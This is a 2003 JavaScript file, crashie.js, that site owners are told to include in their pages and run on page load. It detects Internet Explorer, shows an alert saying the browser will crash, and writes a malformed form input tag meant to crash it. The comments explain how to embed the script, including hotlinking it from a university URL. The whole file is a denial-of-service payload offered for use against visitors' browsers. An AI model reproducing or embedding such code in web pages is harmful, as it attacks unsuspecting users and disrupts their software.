// Hung-Te Lin <piaip@csie.ntu.edu.tw>, Sat May  3 19:43:56 CST 2003
// $Id: crashie.js,v 1.1 2003/05/03 11:49:22 r91034 Exp r91034 $
// This is a script to crash IE.
// ----------------------------------------------------------------- 
// to include it, type 
//    <script type="text/javascript" src="crashie.js"></script>
// in your <head> ... </head>.
// then you may use <body onLoad="crashIE();"> to invoke it.
// If you don't want to put this file in your directory,
// change the <script> line to the official URL of this file:
// <script type="text/javascript" src="http://www.csie.ntu.edu.tw/~r91034/crashie.js"></script>
// ----------------------------------------------------------------

function crashIE() {
    if(window.navigator.userAgent.indexOf("MSIE") != -1) {
        alert("This is non-IE ONLY Page! Your IE will crash now.");
	document.write("<form><input type crash></form>");
    }
}
